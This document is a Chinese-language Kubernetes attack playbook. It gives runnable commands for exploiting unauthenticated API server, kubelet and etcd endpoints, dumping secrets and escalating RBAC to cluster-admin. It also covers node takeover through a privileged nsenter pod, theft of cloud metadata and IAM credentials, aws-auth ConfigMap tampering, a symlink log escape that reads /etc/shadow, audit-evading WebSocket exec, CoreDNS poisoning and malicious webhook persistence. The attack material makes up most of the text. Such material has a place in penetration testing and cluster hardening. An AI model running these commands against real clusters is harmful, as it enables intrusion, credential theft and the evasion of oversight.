# K8s 集群层面攻击

## 1. API Server 未授权访问

### 1.1 匿名访问（8080 端口 / 错误配置）
```bash
# 不安全端口（8080）直接访问
curl http://API_SERVER:8080/api/v1/namespaces
curl http://API_SERVER:8080/api/v1/secrets

# 匿名用户权限测试
curl -sk https://API_SERVER:6443/api/v1/namespaces/default/pods
# 如果返回 200 → 匿名访问启用
```

### 1.2 通过 Token 访问
```bash
# 使用窃取的 Token
TOKEN="eyJhbGciOi..."
curl -sk -H "Authorization: Bearer $TOKEN" https://API_SERVER:6443/api

# 枚举权限（关键步骤）
# 检查能否列出 secrets
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://API_SERVER:6443/api/v1/secrets 2>&1 | head -5

# 检查能否创建 pods
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://API_SERVER:6443/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'
```

### 1.3 kubectl 使用
```bash
# 配置 kubeconfig
kubectl config set-cluster pwn --server=https://API_SERVER:6443 --insecure-skip-tls-verify=true
kubectl config set-credentials pwn --token=$TOKEN
kubectl config set-context pwn --cluster=pwn --user=pwn
kubectl config use-context pwn

# 信息收集
kubectl get nodes -o wide
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl auth can-i --list    # 当前权限列表
```

## 2. Kubelet 攻击（10250/10255）

### 2.1 只读端口（10255）
```bash
# 信息泄露：列出所有 Pod 及其环境变量
curl -s http://NODE_IP:10255/pods | python3 -c "
import json,sys
pods = json.load(sys.stdin)['items']
for p in pods:
    ns = p['metadata']['namespace']
    name = p['metadata']['name']
    print(f'[{ns}] {name}')
    for c in p['spec']['containers']:
        for e in c.get('env', []):
            if any(k in e.get('name','').lower() for k in ['pass','key','secret','token']):
                print(f'  ENV: {e[\"name\"]}={e.get(\"value\",\"<from-ref>\")}')
"
```

### 2.2 读写端口（10250）
```bash
# 列出 Pod
curl -sk https://NODE_IP:10250/pods

# 在指定 Pod 中执行命令
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -d "cmd=id"

curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# 也可用 kubeletctl 工具
kubeletctl -s NODE_IP pods
kubeletctl -s NODE_IP exec "id" -p POD -c CONTAINER -n NAMESPACE
```

## 3. etcd 攻击（2379）

etcd 存储 K8s 所有状态数据，包括 Secrets（base64 编码）。

```bash
# 直接访问（无认证）
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only | head -50

# 提取所有 Secrets
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix --print-value-only

# 如果需要证书认证
etcdctl --endpoints=https://ETCD_IP:2379 \
  --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca \
  get /registry/secrets --prefix

# 提取 ServiceAccount Token
etcdctl --endpoints=http://ETCD_IP:2379 \
  get /registry/secrets/kube-system --prefix --print-value-only | strings | grep 'eyJ'
```

## 4. RBAC 权限滥用

### 4.1 高危权限组合
| 权限 | 危害 |
|------|------|
| create pods | 创建特权 Pod → 节点接管 |
| list secrets | 读取所有密码/Token |
| create clusterrolebindings | 自我提权为 cluster-admin |
| create serviceaccounts/token | 生成高权限 Token |
| patch daemonsets | 在所有节点部署后门 |

### 4.2 RBAC 提权路径
```bash
# 如果有 create clusterrolebindings 权限
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default

# 如果只有 namespace 级 create rolebindings 权限，只能在对应 namespace 内绑定 Role/ClusterRole
kubectl create rolebinding pwn --clusterrole=admin --serviceaccount=default:default -n TARGET_NAMESPACE

# 如果有 create serviceaccounts/token
kubectl create token default --duration=999999h

# 如果有 patch deployments（注入到现有高权限 Pod）
kubectl patch deployment DEPLOY_NAME -p '{"spec":{"template":{"spec":{"containers":[{"name":"pwn","image":"alpine","command":["sleep","infinity"],"securityContext":{"privileged":true}}]}}}}'
```

## 5. 横向移动

### 5.1 Pod 间移动
```bash
# 发现内部服务
env | grep SERVICE
kubectl get svc --all-namespaces

# 直接访问 ClusterIP 服务
curl http://10.96.x.x:PORT
```

### 5.2 节点接管
```bash
# 创建特权 Pod 指定到目标节点
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: node-pwn
spec:
  nodeName: TARGET_NODE
  hostNetwork: true
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
    securityContext:
      privileged: true
EOF
```

## 6. 云 Metadata 利用

在云环境的 K8s 集群中，Pod 可能能访问云 Metadata：
```bash
# AWS
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## 7. Helm / Tiller（旧版本）

Tiller（Helm v2）如果存在，通常有 cluster-admin 权限：
```bash
# 检查 Tiller
kubectl get pods -n kube-system | grep tiller
# Tiller gRPC 端口 44134
curl http://TILLER_IP:44134
```

## 8. K8s 到云环境横向穿透（Pivoting to Cloud）

在云托管的 K8s 集群（EKS/GKE/AKS）中，Pod 和节点通常绑定了云 IAM 角色。窃取这些凭据可以从 K8s 跳转到云控制平面。

### 8.1 节点 IAM 角色窃取

节点（EC2/GCE/Azure VM）通常绑定了 IAM 角色。从 Pod 内访问 IMDS 获取临时凭据：
```bash
# 通用检测：IMDS 是否可达
curl -s -m 3 http://169.254.169.254/ && echo "IMDS REACHABLE"

# AWS — 获取节点 IAM 角色凭据
IAM_ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "Node IAM Role: $IAM_ROLE"
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE"
# 返回 AccessKeyId / SecretAccessKey / Token

# GCP — 获取节点 SA Token
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Azure — 获取托管标识 Token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

注意：Pod 中访问 IMDS 可能受 `--metadata-endpoint-restrictions` 或 IMDSv2 hop 限制。使用 `hostNetwork: true` 的 Pod 可以绕过 hop 限制。

### 8.2 AWS EKS — IRSA（推荐方式）Token 窃取

EKS 通过 OIDC 将 IAM Role 绑定到 K8s SA，Pod 中会挂载 JWT Token：
```bash
# 检查环境变量
echo $AWS_ROLE_ARN
echo $AWS_WEB_IDENTITY_TOKEN_FILE
# 默认路径: /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# 使用窃取的 Token 获取 AWS 临时凭据
aws sts assume-role-with-web-identity \
  --role-arn "$AWS_ROLE_ARN" \
  --role-session-name pwned \
  --web-identity-token "file://$AWS_WEB_IDENTITY_TOKEN_FILE"

# 搜索集群中所有带 IAM 注解的 SA
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  for sa in $(kubectl get sa -n $ns -o jsonpath='{.items[*].metadata.name}'); do
    ROLE=$(kubectl get sa $sa -n $ns -o jsonpath='{.metadata.annotations.eks\.amazonaws\.com/role-arn}' 2>/dev/null)
    [ -n "$ROLE" ] && echo "[$ns] $sa → $ROLE"
  done
done
```

### 8.3 GCP GKE — Workload Identity Token 窃取

GKE 通过 Workload Identity 将 GCP SA 绑定到 K8s SA：
```bash
# 搜索带 GCP SA 注解的 K8s SA
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  for pod in $(kubectl get pods -n $ns -o jsonpath='{.items[*].metadata.name}'); do
    kubectl get pod $pod -n $ns -o yaml 2>/dev/null | grep -q "gcp-service-account" && \
      echo "[$ns] $pod has GCP SA binding"
  done
done

# Pod 内检查 Workload Identity
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

# 也检查挂载的 JSON 密钥文件
find / -name "*.json" -path "*/secrets/*" 2>/dev/null
echo $GOOGLE_APPLICATION_CREDENTIALS
```

### 8.4 AWS Kiam/Kube2IAM（旧方式）利用

旧版 EKS 集群可能使用 Kiam 或 Kube2IAM DaemonSet 来分配 IAM 角色：
```bash
# 检查命名空间注解
kubectl get ns -o yaml | grep -A2 "iam.amazonaws.com"

# 检查 Pod 注解
kubectl get pods --all-namespaces -o yaml | grep "iam.amazonaws.com/role"

# 如果发现 → 创建带有目标角色注解的 Pod 即可获取 IAM 凭据
```

### 8.5 EKS 节点 IAM → 受限 TokenRequest 滥用

EKS 节点凭据会经由 AWS IAM Authenticator 映射为节点身份，但不能通过 `kubectl --as=system:node:<NODE_NAME>` 任意伪装；`--as` 需要额外的 impersonate 授权。节点身份通常还受 NodeAuthorizer / NodeRestriction 约束，只能围绕该节点上实际运行的 Pod 和其 ServiceAccount 尝试 TokenRequest。
```bash
# 使用真实节点身份凭据访问 API 后，针对该节点上实际 Pod 的 SA 尝试创建绑定 Token
kubectl create token -n kube-system <SA_NAME> \
  --bound-object-kind=Pod \
  --bound-object-name=<POD_NAME> \
  --bound-object-uid=<POD_UID>
```

### 8.6 aws-auth ConfigMap 篡改（EKS 特有）

如果有 kube-system 命名空间的 ConfigMap 修改权限，可以篡改 `aws-auth` 获取 cluster-admin：
```bash
# 查看当前 aws-auth 配置
kubectl get configmap aws-auth -n kube-system -o yaml

# 添加攻击者控制的 IAM Role 为 system:masters
kubectl edit -n kube-system configmap/aws-auth
# 在 mapRoles 中添加:
#   - rolearn: arn:aws:iam::ATTACKER_ACCOUNT:role/AttackerRole
#     username: cluster-admin
#     groups:
#       - system:masters
```

## 9. /var/log 挂载逃逸

当 Pod 挂载了宿主机的 `/var/log` 目录时，可以利用 kubelet 的日志读取接口窃取宿主机文件：

```bash
# 方法 1：符号链接劫持 Pod 日志文件
# Pod 日志通常在 /var/log/pods/NAMESPACE_POD_UID/CONTAINER/0.log
# 替换为指向目标文件的符号链接
ln -sf /etc/shadow /var/log/pods/default_mypod_xxxxx/mycontainer/0.log
# 然后通过 kubectl logs 读取
kubectl logs mypod --tail=100

# 方法 2：如果有 nodes/log 读取权限
# 创建符号链接指向宿主机根目录
ln -sf / /host-log/sym
# 通过 Kubelet API 浏览宿主机文件系统
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://NODE_IP:10250/logs/sym/"
```

如果挂载为只读但有 `CAP_SYS_ADMIN`，可以重新挂载为读写：
```bash
mount -o rw,remount /hostlogs/
```

## 10. nodes/proxy WebSocket 绕过

`nodes/proxy` 的 GET 权限可以通过 WebSocket 协议在 Pod 中执行命令，绕过正常的 `pods/exec` 权限检查：

```bash
# 检查是否有 nodes/proxy 权限
kubectl auth can-i --list | grep "nodes/proxy"

# 通过 WebSocket 直接连接 Kubelet 执行命令（绕过 API Server 审计）
# 需要能直接访问节点 IP:10250
websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol "v4.channel.k8s.io" \
  "wss://NODE_IP:10250/exec/NAMESPACE/POD/CONTAINER?output=1&error=1&command=id"
```

原理：WebSocket 握手使用 HTTP GET，kubelet 将其映射为 RBAC `get` 动词而非 `create`。`/exec` 等端点未显式映射，默认归入 `proxy` 子资源，因此 `nodes/proxy` + `get` 即可执行命令。API Server 审计日志中不会记录 `pods/exec` 事件。

## 11. CSR 签名请求 → 伪造节点身份

拥有 `create certificatesigningrequests` 权限时，可以伪造新节点的 TLS 证书：
```bash
# 创建 CSR 伪造节点身份
# Subject: /O=system:nodes/CN=system:node:<目标节点名>
# 如果集群配置了自动签名，CSR 会被自动批准
# 批准后获得该节点的证书 → 可以作为该节点访问 API Server
# 节点身份可以访问挂载在该节点上的所有 Pod 的 Secrets
```

## 12. CoreDNS ConfigMap 投毒

修改 `coredns` ConfigMap 可以劫持集群内的 DNS 解析，实现中间人攻击：
```bash
# 下载当前配置
kubectl get configmap coredns -n kube-system -o yaml > coredns.yaml

# 在 Corefile 中添加 rewrite 规则
# 例如：将 victim-service.default.svc.cluster.local 重定向到攻击者 Pod
# rewrite name victim-service.default.svc.cluster.local attacker-pod.default.svc.cluster.local

# 应用修改
kubectl apply -f coredns.yaml

# 或直接编辑
kubectl edit configmap coredns -n kube-system
```

## 13. Admission Controller 持久化

如果有 `create/update mutatingwebhookconfigurations` 权限，可以注入恶意 Admission Controller，修改所有新建 Pod 的镜像或注入后门容器：
```bash
# 部署恶意 Webhook 后，所有新建 Pod 的容器镜像会被替换
# 或自动注入 sidecar 容器用于窃取凭据

# 检查现有 Webhook 配置
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations
```

攻击者可以通过 Webhook 实现：
- 替换 Pod 容器镜像为植入后门的版本
- 注入 sidecar 容器窃取流量和凭据
- 修改环境变量添加恶意配置
- 禁用 Pod 的安全上下文限制
